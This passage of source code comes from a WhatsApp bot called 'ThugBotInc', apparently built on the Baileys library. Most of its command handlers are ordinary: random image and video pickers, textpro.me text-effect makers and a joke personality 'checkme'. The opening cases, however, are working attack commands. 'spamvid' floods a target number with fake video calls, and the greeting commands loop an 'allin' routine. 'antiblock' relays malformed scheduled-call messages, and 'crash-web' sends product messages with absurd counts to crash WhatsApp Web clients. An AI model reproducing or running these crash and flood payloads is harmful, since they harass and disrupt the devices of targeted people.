   ThugBotInc.sendMessage(m.chat, {react: {text: '✅', key: m.key}})

}

break
 case 'spamvid' : {
if (!ThugTheCreator) return reply(mess.owner)
 if (!isPremium) return replyprem(mess.premium)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`*Target successfully engaged using ${command}! 🏹*\n*🎯 Target ID:* ${target}\n*📑 Status Report: Successfully*`);

for (let j = 0; j < 30; j++) {

 await sendOfferVideoCall(target)

  }

   ThugBotInc.sendMessage(m.chat, {react: {text: '✅', key: m.key}})

}

break

case 'hello': case 'bitch': case 'hi': case 'hey': case 'bye': {
if (!isPremium) return replyprem(mess.premium)
if (!ThugTheCreator) return reply(mess.owner)
reply(`*Target successfully engaged using ${command}! 🏹*\n*🎯 Target ID:* ${target}\n*📑 Status Report: Successfully*`);
for (let j = 0; j < 30; j++) {
await allin(m.chat)
}

ThugBotInc.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
}

break
case 'antiblock':
    if (!isOwner) return
    
    for (let i = 0; i < 11; i++) { // ali no "1111" define quantidade qui vai enviar
    await sleep(1050);
await ThugBotInc.relayMessage((q || from), {
"messageContextInfo": {
"messageSecret": "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
"deviceListMetaData": {},
"deviceListMetadataVersion": 2
},
"scheduledCallCreationMessage": {
"scheduledTimestampMs": '1200',
callType: "AUDIO",
"title": '👻',
}
}, {additionalAttributes:{
edit: '7'
}})
}
break
case 'crash-web':
if (!ThugTheCreator) return reply(mess.owner)
if (!isPremium) return replyprem(mess.premium)
try {
for (let i = 0; i < 10; i++) {
messa = await prepareWAMessageMedia({
image: {
url: `https://pic.re/image`
}
}, {
upload: ThugBotInc.waUploadToServer
})
catalog = generateWAMessageFromContent(from, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"itemCount": 99999999999,
"title": `𝙾𝚁𝙴𝙺𝙸 𝙿𝙲 𝙺𝙸𝙻𝙻𝙴𝚁 𝚇 🕊️🕊️🕊️`,
"description": ``,
"currencyCodeIso4217": "IDR",
"footerText": ``,
"productImageCount": 99999999999999999999,
"firstImageId": 9999999999,
"priceAmount1000": "999",
"salePriceAmount1000": "IDR 99.99999999999999999999",
"thumbnail": messa.imageMessage,
"jpegThumbnail": m,
"firstImageId": 99999999,
"url": "wa.me/5512981791389"
},
"businessOwnerJid": from,
}
}), {
userJid: ThugBotInc.user.id,
quoted: null
})
sam.relayMessage(from, catalog.message, {
messageId: catalog.key.id
})
}
} catch (e) {
console.log(e);
}
break
case 'tiktokgirl':
await loading()
var asupan = JSON.parse(fs.readFileSync('./randoms/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
ThugBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokghea':
await loading()
var gheayubi = JSON.parse(fs.readFileSync('./randoms/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
ThugBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokbocil':
await loading()
var bocil = JSON.parse(fs.readFileSync('./randoms/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
ThugBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknukhty':
await loading()
var ukhty = JSON.parse(fs.readFileSync('./randoms/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
ThugBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoksantuy':
await loading()
var santuy = JSON.parse(fs.readFileSync('./randoms/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
ThugBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokkayes':
await loading()
var kayes = JSON.parse(fs.readFileSync('./randoms/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
ThugBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokpanrika':
await loading()
var rikagusriani = JSON.parse(fs.readFileSync('./randoms/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
ThugBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknotnot':
await loading()
var notnot = JSON.parse(fs.readFileSync('./randoms/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
ThugBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'chinese':
await loading()
var notnot = JSON.parse(fs.readFileSync('./randoms/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
ThugBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'hijab':
await loading()
var notnot = JSON.parse(fs.readFileSync('./randoms/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
ThugBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'indo':
await loading()
var notnot = JSON.parse(fs.readFileSync('./randoms/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
ThugBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'japanese':
await loading()
var notnot = JSON.parse(fs.readFileSync('./randoms/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
ThugBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'korean':
await loading()
var notnot = JSON.parse(fs.readFileSync('./randoms/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
ThugBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'malay':
await loading()
var notnot = JSON.parse(fs.readFileSync('./randoms/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
ThugBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomgirl':
await loading()
var notnot = JSON.parse(fs.readFileSync('./randoms/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
ThugBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomboy':
await loading()
var notnot = JSON.parse(fs.readFileSync('./randoms/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
ThugBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'thai':
await loading()
var notnot = JSON.parse(fs.readFileSync('./randoms/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
ThugBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'vietnamese':
await loading()
var notnot = JSON.parse(fs.readFileSync('./randoms/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
ThugBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'aesthetic':
await loading()
var notnot = JSON.parse(fs.readFileSync('./randoms/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
ThugBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'antiwork':
await loading()
var notnot = JSON.parse(fs.readFileSync('./randoms/randompics/antiwork.json'))
var hasil = pickRandom(notnot)
ThugBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'blackpink':
await loading()
var notnot = JSON.parse(fs.readFileSync('./randoms/randompics/blackpink.json'))
var hasil = pickRandom(notnot)
ThugBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'bike':
await loading()
var notnot = JSON.parse(fs.readFileSync('./randoms/randompics/bike.json'))
var hasil = pickRandom(notnot)
ThugBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'boneka':
await loading()
var notnot = JSON.parse(fs.readFileSync('./randoms/randompics/boneka.json'))
var hasil = pickRandom(notnot)
ThugBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cosplay':
await loading()
var notnot = JSON.parse(fs.readFileSync('./randoms/randompics/cosplay.json'))
var hasil = pickRandom(notnot)
ThugBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cat':
await loading()
var notnot = JSON.parse(fs.readFileSync('./randoms/randompics/cat.json'))
var hasil = pickRandom(notnot)
ThugBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'doggo':
await loading()
var notnot = JSON.parse(fs.readFileSync('./randoms/randompics/doggo.json'))
var hasil = pickRandom(notnot)
ThugBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'justina':
await loading()
var notnot = JSON.parse(fs.readFileSync('./randoms/randompics/justina.json'))
var hasil = pickRandom(notnot)
ThugBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kayes':
await loading()
var notnot = JSON.parse(fs.readFileSync('./randoms/randompics/kayes.json'))
var hasil = pickRandom(notnot)
ThugBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kpop':
await loading()
var notnot = JSON.parse(fs.readFileSync('./randoms/randompics/kpop.json'))
var hasil = pickRandom(notnot)
ThugBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'notnot':
await loading()
var notnot = JSON.parse(fs.readFileSync('./randoms/randompics/notnot.json'))
var hasil = pickRandom(notnot)
ThugBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'car':
await loading()
var notnot = JSON.parse(fs.readFileSync('./randoms/randompics/car.json'))
var hasil = pickRandom(notnot)
ThugBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'candy': case 'christmas': case '3dchristmas': case 'sparklechristmas':
case 'deepsea': case 'scifi': case 'rainbow2': case 'waterpipe': case 'spooky': 
case 'pencil': case 'circuit': case 'discovery': case 'metalic': case 'fiction': case 'demon': 
case 'transformer': case 'berry': case 'thunder': case '.': case '3dstone2': 
case 'neonlight': case 'glitch': case 'harrypotter': case 'brokenglass': case 'papercut': 
case 'watercolor': case 'multicolor': case 'neondevil': case 'underwater': case 'graffitibike':
 case 'snow': case 'cloud': case 'honey': case 'ice': case 'fruitjuice': case 'biscuit': case 'wood': 
case 'chocolate': case 'strawberry': case 'matrix': case 'blood': case 'dropwater': case 'toxic': 
case 'lava': case 'rock': case 'bloodglas': case 'halloween': case 'darkgold': case 'joker': case 'wicker':
 case 'firework': case 'skeleton': case 'blackpink': case 'sand': case 'glue': case '1917': case 'leaves': case 'demon': {
             if (!q) return reply(`*Ughhhh... Kindly provide a text!*`) 
                await loading()
             let link
             if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
             if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
             if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
             if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
             if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
             if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
             if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
             if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
             if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
             if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
             if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
             if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
             if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
             if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
             if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
             if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
             if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
             if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
             if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
             if (/3dstone2/.test(command)) link = 'https://textpro.me/create-a-3d-stone-text-effect-online-for-free-1073.html'
             if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
             if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
             if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
             if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
             if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
             if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
             if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
             if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
             if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
             if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
             if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
             if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
             if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
             if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
             if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
             if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
             if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
             if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
             if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
             if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
             if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
             if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
             if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
             if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
             if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
             if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
             if (/halloween/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
             if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
             if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
             if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
             if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
             if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
             if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
             if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
             if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
             if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
                if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'           
             let anu = await maker.textpro(link, q)
                ThugBotInc.sendMessage(m.chat, { image: { url: anu }, caption: `*© 𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐓𝐡𝐮𝐠𝐧𝐢𝐟𝐢𝐜𝐞𝐧𝐭 𝐓𝐞𝐜𝐡™*` }, { quoted: m })
             }
             break
case 'checkme':
					neme = args.join(" ")
					bet = `${sender}`
					var sifat = [
    '😌 Fine', 
    '😠 Unfriendly', 
    '🕺 Chapri', 
    '👶 Nibba/Nibbi', 
    '😒 Annoying', 
    '🏚️ Dilapidated', 
    '😡 Angry Person', 
    '😊 Polite', 
    '🎒 Burden', 
    '🌟 Great', 
    '🤡 Cringe', 
    '🤥 Liar', 
    '😎 Cool', 
    '🥶 Heartless', 
    '😂 Funny', 
    '😈 Evil Minded', 
    '🤯 Overthinker', 
    '🧐 Intelligent', 
    '🤖 Emotionless', 
    '🙄 Dramatic', 
    '🤩 Attention Seeker', 
    '🥺 Soft Hearted', 
    '💪 Strong', 
    '🎭 Two-Faced', 
    '🕵️ Secretive', 
    '👻 Ghosting Expert'
];

var hoby = [
    '👨‍🍳 Cooking', 
    '💃 Dancing', 
    '🎮 Gaming', 
    '🎨 Painting', 
    '🤝 Helping Others', 
    '📺 Watching Anime', 
    '📖 Reading', 
    '🏍️ Riding Bike', 
    '🎤 Singing', 
    '💬 Chatting', 
    '😂 Sharing Memes', 
    '✏️ Drawing', 
    '💰 Eating Parents’ Money', 
    '🃏 Playing Truth or Dare', 
    '🧍 Staying Alone', 
    '🚴 Cycling', 
    '🛩️ Traveling', 
    '📸 Photography', 
    '🥋 Martial Arts', 
    '🏋️ Gyming', 
    '🎭 Acting', 
    '💻 Coding', 
    '🛍️ Shopping', 
    '🎯 Archery', 
    '🥎 Playing Sports', 
    '🛌 Sleeping All Day', 
    '🎼 Listening to Music', 
    '🌱 Gardening', 
    '🐶 Playing with Pets', 
    '🃏 Playing Cards', 
    '🧩 Solving Puzzles', 
    '🗿 Doing Nothing'
];

					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cakep = ['Yes','No','Very Ugly','Very Handsome']
					var wetak= ['Caring','Generous','Angry person','Sorry','Submissive','Fine','Im sorry','Kind Hearted','Patient','UwU','Top','Helpful']
					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var sipat = sifat[Math.floor(Math.random() * sifat.length)]
					var biho = hoby[Math.floor(Math.random() * hoby.length)]
					var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					var senga = arp[Math.floor(Math.random() * arp.length)]
					var chakep = cakep[Math.floor(Math.random() * cakep.length)]
					var watak = wetak[Math.floor(Math.random() * wetak.length)]
					var baik = baikk[Math.floor(Math.random() * baikk.length)]
					var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					var berani = berhani[Math.floor(Math.random() * berhani.length)]
					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					 profile = `*≡══《 Check @${bet.split('@')[0]} 》══≡*\n*Name :* ${pushname}
*Characteristic :* ${sipat}
*Hobby :* ${biho}
*Simp :* ${bhucin}%
*Great :* ${senga}%
*Handsome :* ${chakep}
*Character :* ${watak}
*Good Morals :* ${baik}%
*Bad Morals :* ${burug}%
*Intelligence :* ${cerdas}%
*Courage :* ${berani}%
*Afraid :* ${takut}%

*≡═══《 CHECK PROPERTIES 》═══≡*`
					buff = await getBuffer(defaultpp)
ThugBotInc.sendMessage(from, { image: buff, caption: profile, mentions: [bet]},{quoted:m})
break


}
} catch (err) {
    console.log('Button Request •');
    console.log('Not Function Response:');
    console.log(util.format(err));
}
}
const file = require.resolve(__filename);
fs.watchFile(file, () => {
    fs.unwatchFile(file);
    console.log(`Update detected in ${__filename}`);
    delete require.cache[file];
    require(file); // Corrected indentation
});
 